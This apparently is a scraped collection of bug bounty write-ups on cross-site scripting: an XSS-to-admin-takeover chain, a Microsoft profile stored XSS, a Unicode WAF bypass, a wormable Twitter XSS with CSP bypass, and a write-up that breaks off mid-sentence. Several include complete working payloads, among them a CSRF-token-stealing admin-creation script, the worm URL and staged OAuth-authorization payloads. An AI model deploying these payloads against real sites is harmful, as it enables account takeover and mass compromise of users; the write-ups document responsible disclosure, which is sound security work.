{"source_url": "https://medium.com/a-bugz-life/from-reflected-xss-to-account-takeover-showing-xss-impact-9bc6dd35d4e6", "title": "From Reflected XSS to Account Takeover — Showing XSS Impact | by A Bug’z Life | A Bug’z Life | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/a-bugz-life/from-reflected-xss-to-account-takeover-showing-xss-impact-9bc6dd35d4e6. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFrom Reflected XSS to Account Takeover — Showing XSS Impact | by A Bug’z Life | A Bug’z Life | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in A Bug’z Life · Our experiences navigating through infosec engineering & stuff From Reflected XSS to Account Takeover — Showing XSS Impact A Bug’z Life 5 min read · Apr 30, 2019 -- 3 Listen Share After starting bug hunting a little over 2 months ago, here is our first bug writeup, enjoy! We’ve been hunting on a private program on HackerOne for a couple weeks with a fair bit of success, but most findings have been medium-ish severity and nothing to write home about. One big thing we noticed is how devastating XSS vulns would be if targeted to admin users. This was because the invitation of new users, including admins, did not require any form of re-authentication/verification before doing so. We had already found quite a few stored XSS, but didn’t really attempt any privilege escalation because in order to create the stored XSS, you would’ve already needed some level of privileged access. So theoretically we could’ve escalated our privileges, but it wouldn’t have been much more severe than the XSS itself. Moving forward to more recently, we had been testing the way 2 of their apps integrate together, which uses OAuth2 authentication. Normally, we’d target things like open redirect or CSRF via static state parameters, but those seemed to be handled well. We did notice some quite odd behavior when handling the redirect_uri parameter. Essentially, if any of the other required parameters were incorrect or missing (such as state , client_id , etc.), you would be redirected to an error page with one button to click on that indicated the bad request. That button was an <a> tag and whatever value that was in the redirect_uri parameter was the href value. So naturally we tried javascript:alert(1) as the redirect_uri parameter, and was presented with a beautiful alert box indicating the XSS was successful. Because we had already found several other XSS’ on this program, it was basically muscle memory to go ahead and submit the report. When doing so, we paused. Remembering back on how their admin/user invitation process looked like, and how an account takeover could easily be performed when finding the right XSS. Alas, this is the perfect XSS to show how easily we can escalate our privileges to an admin level, allowing us to do whatever we’d like. We would be essentially going from zero access (don’t even need a user account, which is important to note as this is an invite only platform), to full access. After taking a closer look at the POST request to create a new admin, it was a multipart form with about 30 fields, but only a few were required. Those were login , firstname , lastname , email , role_id , and of course csrf-token . So the next step was to figure out how to extract the csrf-token , which proved to be quite simple. When performing a GET request to the user creation endpoint and viewing the source, the csrf-token was found stored in a meta tag, which looks like: <meta name=\"csrf-token\" content=\"UdNWofQE+cZSKftgI7GnDpmImM7vTJB9ew3dF53+/Ekwtg2KWw/nRbHdIHIoDd4L+HQ/w7xTUPB2ZHnG01fxnQ==\" /> So we can perform a GET request, store the csrf-token value, and then send a POST request to the same endpoint with the required fields. The code to get the token looks like: var url = \"/ user/new \"; var xhr = new XMLHttpRequest(); xhr.responseType = \"document\"; xhr.open(\"GET\", url, true); xhr.onload = function (e) { if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) { page = xhr.response // Get the csrf token from meta tag token = page.getElementsByName('csrf-token')[0].getAttribute('content') // Show the token console.log(\"The token is: \" + token); } }; xhr.send(null); With this, we now have our CSRF token. The final PoC code to execute the XSS and create ourself an admin user using the token we just extracted looks like: var url = \" /user/new \"; function submitFormWithToken(token) { var xhr = new XMLHttpRequest(); xhr.open(\"POST\", url, true); var formData = new FormData(); formData.append(\"authenticity_token\", token); formData.append(\"login\", \"neemaPoC\"); formData.append(\"firstname\", \"Neema\"); formData.append(\"lastname\", \"PoC\"); formData.append(\"email\", \"xss_demo @gmail.com \"); // role_id = 2 is the admin role formData.append(\"role_ids[]\", 2); formData.append(\"new_status\", \"active\"); xhr.send(formData); } var xhr = new XMLHttpRequest(); xhr.responseType = \"document\"; xhr.open(\"GET\", url, true); xhr.onload = function (e) { if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) { page = xhr.response // Get the csrf token from meta tag token = page.getElementsByName('csrf-token')[0].getAttribute('content') // Show the token console.log(\"The token is: \" + token); // Use the token to submit the form submitFormWithToken(token); } }; // Make the request xhr.send(null); When minified and url encoded, the final PoC reflected XSS URL was (luckily we didn’t have to worry about any length restrictions): https://company.com/oauth2/authorizations/new?redirect_uri=javascript: var%20url%3D%22%2Fuser%2Fnew%22%3Bfunction%20submitFormWithToken%28e%29%7Bvar%20t%3Dnew%20XMLHttpRequest%3Bt.open%28%22POST%22%2Curl%2C%210%29%3Bvar%20n%3Dnew%20FormData%3Bn.append%28%22authenticity_token%22%2Ce%29%2Cn.append%28%22login%22%2C%22neemaPoC%22%29%2Cn.append%28%22firstname%22%2C%22Neema%22%29%2Cn.append%28%22lastname%22%2C%22PoC%22%29%2Cn.append%28%22email%22%2C%22xss_demo%40gmail.com%22%29%2Cn.append%28%22role_ids%5B%5D%22%2C2%29%2Cn.append%28%22new_status%22%2C%22active%22%29%2Ct.send%28n%29%7Dvar%20xhr%3Dnew%20XMLHttpRequest%3Bxhr.responseType%3D%22document%22%2Cxhr.open%28%22GET%22%2Curl%2C%210%29%2Cxhr.onload%3Dfunction%28e%29%7Bxhr.readyState%3D%3D%3DXMLHttpRequest.DONE%26%26200%3D%3D%3Dxhr.status%26%26%28page%3Dxhr.response%2Ctoken%3Dpage.getElementsByName%28%22csrf-token%22%29%5B0%5D.getAttribute%28%22content%22%29%2Cconsole.log%28%22The%20token%20is%3A%20%22%2Btoken%29%2CsubmitFormWithToken%28token%29%29%7D%2Cxhr.send%28null%29%3B When clicked on by the user, the 2 requests would be sent, and our admin account would be created. We received a much anticipated registration email in which can be used to set our credentials, and there are never any notifications/confirmations sent to the victim which essentially makes this undetected unless the victim actively verifies account details. For a full account takeover, we could further escalate and delete the other admins as admin is the highest level of access, and one admin can delete any other. After putting together the working PoC and showing how we could fully exploit this XSS (theoretically as an attacker without a user account), the report was submitted to the team. This was also a great lesson about how to show impact in a report. Historically, as soon as bugs were found, we reported them, without giving much thought in how they could be escalated and showing how bad it really is. This exercise has definitely shown that we should be thinking about this more often. Since this bug, we’ve tried to escalate every XSS popped instead of simply reporting it, and it’s really improved the impact & reward since doing so. Some examples: Reflected XSS -> Create Admin User -> Company Account Takeover = 2x Normal XSS Reward Stored XSS -> Change Victim’s Email -> User Account Takeover = 3x Normal XSS Reward Reflected XSS -> Call API Endpoint returning credit card numbers = 2x Normal XSS Reward Reflected XSS -> Change Victim’s Email -> User Account Takeover = 2x Normal XSS Reward So by instead of just reporting <img src=x onerror=alert(1)> , we’ve started to look at what can actually be done with that XSS, and then write the PoC to prove it as it really shows the company what the impact is, and will most likely net you a better reward. Hope this was helpful in showing how bugs can be exploited and escalated, and how important it is to show impact in a report. We’ll be sharing more about our bug bounty journey, stay tuned! JavaScript Security Bug Bounty Hacking Hacking Tools -- -- 3 Published in A Bug’z Life 1.3K followers · Last published Apr 15, 2020 Our experiences navigating through infosec engineering & stuff Written by A Bug’z Life 1.6K followers · 1 following Our blog for all things security and technology related. Everything from our journey along InfoSec career path, bug bounty write-ups and more interesting stuff. Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@kang_ali/stored-xss-on-techprofile-microsoft-d21757588cc1", "title": "Stored XSS on Techprofile Microsoft | by Mohammad Ali Syarief | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@kang_ali/stored-xss-on-techprofile-microsoft-d21757588cc1. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS on Techprofile Microsoft | by Mohammad Ali Syarief | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS on Techprofile Microsoft Mohammad Ali Syarief 2 min read · May 9, 2019 -- 1 Listen Share Details to Reproduce Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. ** Introduction Profile on Microsoft Learn Introducing a new approach to learning. The skills required to advance your career and earn your spot at the top do not come easily. Now there’s a more rewarding approach to hands-on learning that helps you achieve your goals faster. Earn points, levels, and achieve more! ** The bug Vulnerability: XSS Stored (Stored Cross site scripting) Severity: High Owasp rank: (OTG-INPVAL-002) Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. Vulnerable Link on Profil : https://techprofile.microsoft.com/en-us/[profile ] ** Scenario POC 1. Attacker Edit Profil on https://techprofile.microsoft.com/en-us/edit 2. Set Payload XSS 3. Victim see Profil Attacker 4. Cookie send To Attacker Server ** Impact Users can execute arbitrary JavaScript code in the context of other users. This is critical when targeted users have high privileges. Attackers are then able to grant themselves the administrator privileges and even takeover the ownership of the New Relic account. The hacker selected the Cross-site Scripting (XSS) — Stored weakness. This vulnerability type requires contextual information from the hacker. ** Remediation To protect against stored XSS attacks, make sure any dynamic content coming from the data store cannot be used to inject JavaScript on a page. Referensi : https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002) 28/04/2019 ~ Report Vulnerability 30/04/2019 ~ Open Case. 08/05/2019 ~ -Patched / Fixed Security Bug Bounty Microsoft -- -- 1 Written by Mohammad Ali Syarief 20 followers · 2 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/unicode-vs-waf-xss-waf-bypass-128cd9972a30", "title": "Unicode vs WAF — XSS WAF Bypass . | by Prial Islam Khan | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/unicode-vs-waf-xss-waf-bypass-128cd9972a30. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nUnicode vs WAF — XSS WAF Bypass . | by Prial Islam Khan | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Unicode vs WAF — XSS WAF Bypass . Prial Islam Khan 4 min read · Jun 5, 2019 -- 5 Listen Share Hi readers , At 1st Eid Mubarak to all . May Allah bring you joy, happiness, peace and prosperity on this blessed occasion. Wishing you and your family on this happy occasion of Eid! Eid Mubarak ! So on this blessed occasion I thought let’s share one of my finding as Eid bonus 😜 ! From title you may came to know this is a write-up about XSS WAF bypass using UNICODE . So let’s give you a small idea about the application I was testing . There was a option called Save for later what saves items in your account for later use . The request looks like :- Press enter or click to view image in full size Our target applications Save for later option request If a user is properly authenticated then this post request will save items in users account for later use and if a user is not properly authenticated then it will just reflect back with some values . So I was manually fuzzing around with parameters and noticed channel parameter value is being reflected in response body without proper escaping in both authenticated & unauthenticated scenario . I send a request with channel parameter value look like “channel”:”xss\\”><” and the response was :- <a class=\"link nc-text-regular nc-blue js-movetocart\" data-giftitemid=\"<ID>\" data-skuid=\"<ID>\" data-itemnumber=\"<ID>\" data-productid=\"<ID>\" data-channel=\"xss\"><\" data-quantity=\"1\" data-isbundleitem=\"false\" role=\"link\" tabindex=\"0\" aria-label=\"label\">Move to cart</a> Our inputted value is inside <a> tag and we can escape out of it as quotes & less-than/greater-than sign is not being filtered properly . So I thought I have a lot of way to do XSS here until I inputted “channel”:”xss\\”onclick=\\”alert(1)” and the response was :- Press enter or click to view image in full size WAF ! WAF ! WAF !!! 🤕 So there is a WAF in place . To bypass it I started fuzzing and the result was :- \"channel\":\"xss\\\"onclick=\\\"alert(1)\" ==> WAF \"channel\":\"xss\\\"xss=\\\"alert(1)\" ==> WAF \"channel\":\"xss\\\"onclick=\\\"alert(1)\" ==> WAF \"channel\":\"xss\\\"xss=\\\"xxx(1)\" ==> No WAF So I tried to create a tag instead of adding event attributes in <a> tag and I inputted “channel”:”xss\\”><xss>test” and the response was :- <a class=\"link nc-text-regular nc-blue js-movetocart\" data-giftitemid=\"<ID>\" data-skuid=\"<ID>\" data-itemnumber=\"<ID>\" data-productid=\"<ID>\" data-channel=\"xss\">test\" data-quantity=\"1\" data-isbundleitem=\"false\" role=\"link\" tabindex=\"0\" aria-label=\"label\">Move to cart</a> So it’s also removing what’s context looks like a tag . So we don’t have advantage of creating a tag . So our only way is using event attributes in <a> tag by bypassing the WAF . So I tried to do a bruteforce using html-event-attributes.txt by fuzzdb to see if any event is not being blocked by WAF and got nothing interesting . Then I though about unicodes and inputted a random unicode to see if it’s decoding in response or not and bingo it’s decoding unicodes to it’s orginal chars . So now I started playing with unicode+events again and the result was :- \"channel\":\"xss\\\"\\u003E\\u003Cxss\\u003Etest\" ==> data-channel=\"xss\"><xss>test\" \"channel\":\"xss\\\"xss=\\\"co\\u006efirm(domain)\" ==> No WAF \"channel\":\"xss\\\"onc\\u006Cick=\\\"co\\u006efirm(domain)\" ==> HTTP/1.1 403 Forbidden So we got a new advantage and also a new problem here . Advantage is we can now create HTML tags using unicodes . Disadvantage is even after using unicodes we are getting a new error HTTP/1.1 403 Forbidden when we add a event onc\\u006Cick . So again I made a wordlist from html-event-attributes.txt + Unicode and I got onmous\\u0045leave & ond\\u0072ag events giving HTTP/1.1 200 OK and also we can create HTML tags . So I made my final payload :- xss\\\"\\u003E\\u003Ch1 onmous\\u0045leave=co\\u006efirm(domain)\\u003ECome to Me\\u003C/h1\\u003E\\u003Cbr\\u003E\\u003C!-- And response body was :- <a class=\"link nc-text-regular nc-blue js-movetocart\" data-giftitemid=\"<ID>\" data-skuid=\"<ID>\" data-itemnumber=\"<ID>\" data-productid=\"<ID>\" data-channel=\"xss\"><h1 onmouseleave=confirm(domain)>come to me</h1><br><!--\" data-quantity=\"1\" data-isbundleitem=\"false\" role=\"link\" tabindex=\"0\" aria-label=\"label\">Move to cart</a> Press enter or click to view image in full size POST based XSS For unauthenticated users Take mouse pointer in come to me and leave it & boom 😎🤗 Now as this is a POST Request and there is no CSRF protection In place so I chained CSRF + XSS = P2 Stored XSS for authenticated users 😎 . Press enter or click to view image in full size CSRF + XSS = P2 Stored XSS for authenticated users 😎 Thanks for reading . Take a look at my YouTube channel for some POC I shared . Follow me on :- prial Islam (@prial261) | Twitter The latest Tweets from prial Islam (@prial261). A teenager boy with passion of breaking Security 😉😉😉. Pabna… twitter.com Prial Islam Khan Prial Islam Khan is on Facebook. Join Facebook to connect with Prial Islam Khan and others you may know. Facebook gives… www.facebook.com Cheers 😋😉 Xss Bypass Waf Waf Bypass Xss Waf Bypass Bug Bounty -- -- 5 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Prial Islam Khan 1.1K followers · 258 following A teenager boy with passion of Breaking Security . Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@bughunter.sec7/how-i-was-able-to-bypass-xss-protection-on-hackerones-private-program-8914a31339a9", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@bughunter.sec7/how-i-was-able-to-bypass-xss-protection-on-hackerones-private-program-8914a31339a9. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://www.virtuesecurity.com/tale-of-a-wormable-twitter-xss/", "title": "Tale of a Wormable Twitter XSS - Virtue Security", "friendly_explanation": "This is a bug bounty writeup from https://www.virtuesecurity.com/tale-of-a-wormable-twitter-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nTale of a Wormable Twitter XSS - Virtue Security Drag Services Application API AWS Company About Events Partners Resources Whitepapers Webinars Articles KB Contact Let’s Talk Services Application API AWS Company About Events Partners Resources Whitepapers Webinars Articles KB Contact Let’s Talk Application Penetration Testing A Pentester’s Guide to Input Validation Tale of a Wormable Twitter XSS Jump to Stay tuned for more insights Submit Follow us on Tale of a Wormable Twitter XSS Application May 2, 2019 2min Read This is a tale of how we found a wormable XSS on Twitter, and how we managed to fully bypass its CSP policy. TwitterXSSWorm Vulnerability Background In mid-2018, I found a stored XSS on Twitter in the least likely place you could think of. Yes, right in the tweet! But what makes this XSS so special is that it had the potential to be turned into a fully-fledged XSS worm. If the concept of XSS worms is new to you, you might want to read more about it on Wikipedia . A One-click XSS Worm Let me jump right to the full exploit and then we can explain the magic later on. Before this got fixed, tweeting the following URL would have created an XSS worm that spreads from account to account throughout the Twitterverse: https://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=%3C%3Cx%3E/script%3E%3C%3Cx%3Eiframe%20id%3D__twttr%20src%3D/intent/retweet%3Ftweet_id%3D1114986988128624640%3E%3C%3Cx%3E/iframe%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/alert%3Buser_id%3D12%3E%3C%3Cx%3E/script%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/frames%5B0%5D.retweet_btn_form.submit%3Buser_id%3D12%3E “How so? It’s just a link!”, you might wonder. But this, my friend, is no ordinary link. It’s a Welcome Message deeplink 1. The deeplink gets rendered as a Twitter card : A Flaw in Twitter Cards This Twitter card is actually an iframe element which points to https://twitter.com/i/cards/tfw/v1/1114991578353930240 . The iframe is obviously same-origin and not sandboxed (which means we have DOM access to the parent webpage). The payload in the “text” parameter would then get reflected back in an inline JSON object as the value of the default_composer_text key: < script type = \"text/twitter-cards-serialization\" > { \"strings\" : { }, \"card\" : { \"viewer_id\" : \"988260476659404801\" , \"is_caps_enabled\" : true , \"forward\" : \"false\" , \"is_logged_in\" : true , \"is_author\" : true , \"language\" : \"en\" , \"card_name\" : \"2586390716:message_me\" , \"welcome_message_id\" : \"988274596427304964\" , \"token\" : \"[redacted]\" , \"is_emojify_enabled\" : true , \"scribe_context\" : \"%7B%7D\" , \"is_static_view\" : false , \"default_composer_text\" : \"</script><iframe id=__twttr src=/intent/retweet?tweet_id=1114986988128624640></iframe><script src=//syndication.twimg.com/timeline/profile?callback=__twttr/alert;user_id=12></script><script src=//syndication.twimg.com/timeline/profile?callback=__twttr/frames[0].retweet_btn_form.submit;user_id=12> \\ u00A0\" , \"recipient_id\" : \"988260476659404801\" , \"card_uri\" : \"https://t.co/1vVzoyquhh\" , \"render_card\" : true , \"tweet_id\" : \"1114991578353930240\" , \"card_url\" : \"https://t.co/1vVzoyquhh\" }, \"twitter_cldr\" : false , \"scribeData\" : { \"card_name\" : \"2586390716:message_me\" , \"card_url\" : \"https://t.co/1vVzoyquhh\" } } </ script > Note: Once the HTML parser encounters a closing script tag </script> anywhere after the initial opening tag <script> , it gets immediately terminated even when the encountered </script> tag is inside a string literal a comment, or a regex…. Bypassing Input Validation But before you could get to this point, you’d have had to overcome many limitations and obstacles first: Both single and double quotes get escaped to ​\\' and \\\" , respectively. HTML tags get stripped (so a</script>b would become ab ). The payload gets truncated at around 300 characters. There is a CSP policy in place which disallows non-whitelisted inline scripts. At first glance, these might look like proper countermeasures. But the moment I noticed the HTML-tag stripping behavior, my spidey sense started tingling. That’s because this is usually error-prone. Unlike escaping individual characters, stripping tags requires HTML parsing (and parsing is always hard to get right, regexes anybody?). Chaining Vulnerabilities So I started fiddling with a very basic payload </script><svg onload=alert()> and kept fiddling until I ended up with <</<x>/script/test000><</</x><x>svg onload=alert()></><script>1<\\x>2 which got turned into </script/test000><svg onload=alert()> . Jackpot, I immediately reported my finding to the Twitter security team at this point and didn’t wait until I found a bypass for the CSP policy. Bypassing CSP Now, let’s take a closer look at Twitter’s CSP policy: script - src 'nonce-ETj41imzIQ/aBrjFcbynCg==' https : //twitter.com https://*.twimg.com https://ton.twitter.com 'self'; frame-ancestors https://ms2.twitter.com https://twitter.com http://localhost:8889 https://momentmaker-local.twitter.com https://localhost.twitter.com https://tdapi-staging.smf1.twitter.com https://ms5.twitter.com https://momentmaker.twitter.com https://tweetdeck.localhost.twitter.com https://ms3.twitter.com https://tweetdeck.twitter.com https://wfa.twitter.com https://mobile.twitter.com https://ms1.twitter.com 'self' https://ms4.twitter.com; font-src https://twitter.com https://*.twimg.com data: https://ton.twitter.com 'self'; media-src https://twitter.com https://*.twimg.com https://ton.twitter.com blob: 'self'; connect-src https://caps.twitter.com https://cards.twitter.com https://cards-staging.twitter.com https://upload.twitter.com blob: 'self'; style-src https://twitter.com https://*.twimg.com https://ton.twitter.com 'unsafe-inline' 'self'; object-src 'none'; default-src 'self'; frame-src https://twitter.com https://*.twimg.com https://* https://ton.twitter.com 'self'; img-src https://twitter.com https://*.twimg.com data: https://ton.twitter.com blob: 'self'; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXMNQXEZDT&ro=false; An interesting fact is, Twitter doesn’t deploy one global CSP policy throughout the entire app. Instead, different parts of the app have different CSP policies. This is the CSP policy for Twitter cards, and we are only interested in the script-src directive for now. To the trained eye, the wildcard origin https://*.twimg.com looks too permissive and is most likely to be the vulnerable point. So it wasn’t very hard to find a JSONP endpoint on a subdomain of twimg.com : https://syndication.twimg.com/timeline/profile?callback=__twttr;user_id=12 The hard part was, bypassing the callback validation. You can’t simply just specify any callback you like, it must start with the \\_\\_twttr prefix (otherwise, the callback is rejected). This means you can’t pass built-in functions like alert for instance (but you could use \\_\\_twttralert , which of course evaluates to undefined ). I then did a few checks to see which characters are filtered for the callback and which are allowed, and oddly enough, forward slashes were allowed in the “callback” parameter (i.e., ?callback=__twttr/alert ). This would then result in the following response: /**/ __twttr / alert ({ \"headers\" : { \"status\" : 200 , \"maxPosition\" : \"1113300837160222720\" , \"minPosition\" : \"1098761257606307840\" , \"xPolling\" : 30 , \"time\" : 1554668056 }, \"body\" : \"[...]\" }); So now we just need to figure out a way to define a __twttr reference on the window object so we don’t get a ReferenceError exception. There are two ways I could think of to do just that: 1. Find a whitelisted script that defines a __twttr variable and include it in the payload. 2. Set the ID attribute of an HTML element to __twttr (which would create a global reference to that element on the window object). So I went with option #2, and that’s why the iframe element in the payload has an ID attribute despite the fact that we want the payload to be as short as possible. So far, so good. But since we can’t inject arbitrary characters in the callback parameter, this means we are quite limited in what JavaScript syntax we can use (note: the semicolon in ?callback=__twttr/alert;user_id=12 is not part of the callback parameter, it’s actually a URL query separator—the same as “&”). But this is not really much of a problem, as we still can invoke any function we want (similar to a SOME attack ). To sum up what the full payload does: Create an iframe element with the ID “__twttr” which points to a specific tweet using Twitter Web Intents ( https://twitter.com/intent/retweet?tweet_id=1114986988128624640 ). Use the CSP policy bypass to invoke a synchronous function (i.e., alert ) to delay the execution of the next script block until the iframe has fully loaded (the alert is not for show—because of syntax limitations, we cannot simply use setTimeout(func) ). Use the CSP bypass again to submit a form inside the iframe which causes a specific tweet to get retweeted. An XSS worm would ideally spread by retweeting itself. And if there were no syntax limitations, we could have so easily done that. But now that we have to depend on Twitter Web Intents for retweets, we need to know the exact tweet ID and specify that in the payload before actually tweeting it. Quite the dilemma, as tweet IDs are not actually sequential [4] (meaning it won’t be easy to predict the tweet ID beforehand). Oh no, our evil plan is doomed again! Well, not really. There are two other relatively easier ways in which we can make the XSS worm spread: Weaponize a chain of tweets where each tweet in the chain contains a payload that retweets the one preceding it. This way, if you get in contact with any of those tweets, this would initiate a series of retweets which would eventually deliver the first tweet in the chain to every active Twitter account. Simply promote the tweet that carries the XSS payload so it would have much greater reach. Or you could use a mix of those two spreading mechanisms for better results. The possibilities are endless. Also luckily for us, when the “ https://twitter.com/intent/retweet?tweet_id=1114986988128624640 ” page is loaded for an already-retweeted tweet, the frames[0].retweet_btn_form.submit method in the payload would then correspond to a follow action instead of a retweet upon invocation. This means that the first time a weaponized tweet is loaded on your timeline, it’ll immediately get retweeted on your Twitter profile. But the next time you view this tweet again, it will make you follow the attacker’s account! Taking exploitation a step further: Making an XSS worm sure can be fun and amusing, but is that really as far as this can go? In case it wasn’t scary enough for you, this XSS could have also been exploited to force Twitter users into authorizing a malicious third-party app to access their accounts silently and with full permissions via the Twitter “oauth/authorize” API [5]. This could be achieved by loading https://twitter.com/oauth/authorize?oauth_token=[token] in an iframe and then automatically submitting the authorization form included within that page (i.e., the form with the ID oauth_form ). A silent exploit with staged payloads would go as following: Post a tweet with the following as a payload and obtain its ID: </script><iframe src=/oauth/authorize?oauth_token=cXDzjwAAAAAA4_EbAAABaizuCOk></iframe> 2. Post another tweet with the following as a payload and obtain its ID: </script><script id=__twttr src=//syndication.twimg.com/tweets.json?callback=__twttr/parent.frames[0].oauth_form.submit;ids=20></script> 3. Post a third tweet with the following as a payload (which combines the two tweets together in one page) </script><iframe src=/i/cards/tfw/v1/1118608452136460288></iframe><iframe src=/i/cards/tfw/v1/1118609496560029696></iframe> Now as soon as the third tweet gets loaded on a user’s timeline, a malicious third-party app would have full access to their account. The only caveat here is that the “oauth_token” value is valid for one use only and has a relatively short expiry time. But this is not much of a problem either as an attacker could post as many tweets as needed to compromise any number of accounts. The bottom line is, I could have forced you to load any page on Twitter, click any button, submit any form, and what not! P.S. If you want to get in touch, you can find me on Twitter / GitHub . Also don’t forget to follow our official Twitter account ! Disclosure Timeline: 23rd April 2018 – I filed the initial bug report. 25th April 2018 – The report got triaged. 27th April 2018 – Twitter awarded a $2,940 bounty. 4th May 2018 – A fix was rolled out. 7th April 2019 – I provided more information on the CSP bypass. 12th April 2019 – I sent a draft of this write-up directly to a Twitter engineer for comment. 12th April 2019 – I was asked to delay publication until after the CSP bypass is fixed. 22nd April 2019 – The CSP bypass got fixed and we got permission to publish. 2nd May 2019 – The write-up was published publicly. References: [1] https://developer.twitter.com/en/docs/direct-messages/welcome-messages/guides/deeplinking-to-welcome-message.html [2] https://html.spec.whatwg.org/#named-access-on-the-window-object [3] https://www.benhayak.com/2015/06/same-origin-method-execution-some.html [4] https://developer.twitter.com/en/docs/basics/twitter-ids.html [5] https://developer.twitter.com/en/docs/basics/authentication/api-reference/authorize.html Pentest in depth. Subscribe for the latest pentesting resources Join Now Services Application API AWS Company About Us Events Partners Resources Whitepapers Webinars Blog KB Social Let’s Talk © 2025 Virtue Security LLC Privacy Policy Back to top Let’s Talk How it works 01. Schedule Your Intro Provide us with your name and email, then click through to our Calendly page to schedule an initial chat. 02. Demo Call With a demo of your technology we create a testing approach. This helps us ensure the pentest is meaningful and right-sized. 03. Proposal Delivery Post-demo, we’ll craft and send over a detailed proposal for your testing, tailoring our approach to your application or network. Message Submited We'll be in touch shortly! Please select a meeting time that works best for you. Allowing enough time for us to understand your technology is important to properly scope and quote a penetration test. Reason * General inquiries I have something to offer Message Submit Message"}
{"source_url": "https://hackademic.co.in/how-a-classical-xss-can-lead-to-persistent-ato-vulnerability/", "title": "How a classical XSS can lead to persistent ATO Vulnerability? | Hackademic", "friendly_explanation": "This is a bug bounty writeup from https://hackademic.co.in/how-a-classical-xss-can-lead-to-persistent-ato-vulnerability/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow a classical XSS can lead to persistent ATO Vulnerability? | Hackademic Toggle Navigation -> NPTEL Solutions -> Do cool stuff with Python How a classical XSS can lead to persistent ATO Vulnerability? Published by Milind Purswani on June 19, 2019 June 19, 2019 TL;DR (Too long; Do read) Hello Hunters, XSS (Cross Site Scripting) is really one of the most common bugs that we have found atleast once somewhere The thing that is not common is how we report it? Most of the Bug Bounty Programs asses the severity of an issue by considering the worst case impact that a particular POC can demonstrate. For instance, an e-commerce site will not consider a CSRF vulnerability, that can lead to items getting added to victims cart as severe as a CSRF vulnerability, that can force user into changing his email or deleting an account. Similarly, assets like Zomato may not consider it an information disclosure if someone is able to extract public phone numbers and email addresses of their restaurants. It is important to understand your targets before blindly injecting XSS payloads into the form fields. Asking yourself “how is this working?” and what the developer might have thought while working on a particular asset helps you a lot while trying to find bugs. you will end up dreaming about the bugs in the morning and reporting them even if your mother is standing up on your head, admonishing you about brushing your teeth before playing with your laptop. (2/2) — Milind Purswani (@MilindPurswani) June 16, 2019 My friend Yash and I, stumbled across a similar situation while collaborating on a private program. This program in particular had a really small scope and a lot of hackers were working on it before we accepted our invitations. All hackers were given the same credentials for working meaning any xss/template injection that another hacker tried to create could be visible to all the hackers. This is when yash tweeted: This is what happens when multiple hackers are assigned a single group for test accounts haha 😛 #BugBounty #TogetherWeHitHarder pic.twitter.com/ONnVRHktmV — Yash Sodha 🌟 (@y_sodha) March 11, 2019 To be honest, in the beginning it seemed almost impossible to get any injection as the application was heavily secured. It was using Angular in the front end which made it almost impossible to create any injections. By default Angular trusts all user’s input as unsafe. You can read more about it here . It was important to understand the application, and I pretty much got idea about the assets that the web application was trying to protect from their policy page. Since, it was relying on angular in the front-end, trying to create an XSS won’t yield anything. While working with the security team, one of their team members revealed: The application you are testing in: each ‘tenant’ in our system is a ‘company’. The tool is used to onboard new prospects to a client within their company (tenant). Bingo, that’d mean that prospects would have to be invited to the company. It seemed like a feedback portal that is used by tenants to know their customers. But how are the customers getting invited? It turned out that the customers were sent an email to the fill-up some kind of form to onboard themselves. Exploitation So, from my dashboard I sent an email to my other email address and opened the link. This link had the following format: https://REDACTED.com/redacted_url/url;url=http%3A%2F%2FREDACTED.com%3Aanother_redacted_url/ At first it seemed like this was an SSRF but soon Yash pointed out the request getting sent from my browser. This was a let down for me, because at that time I was voraciously looking for an SSRF. I quickly injected my phishing payload https:%2F%2Fmilindpurswani.com%2Fb%2Fphish.html which resulted in phishing page getting popped into the DOM. There was definitely an XSS and upon executing https:// REDACTED.COM /redacted_url/url;url=javascript:alert%28document.domain%29 Normally this’d be enough for demonstrating a working POC. Accoding to the Program’s policy page, since this was a Reflected XSS, it fell under low/medium severity. We were quite satisfied with this and reported the issue hoping it was not a 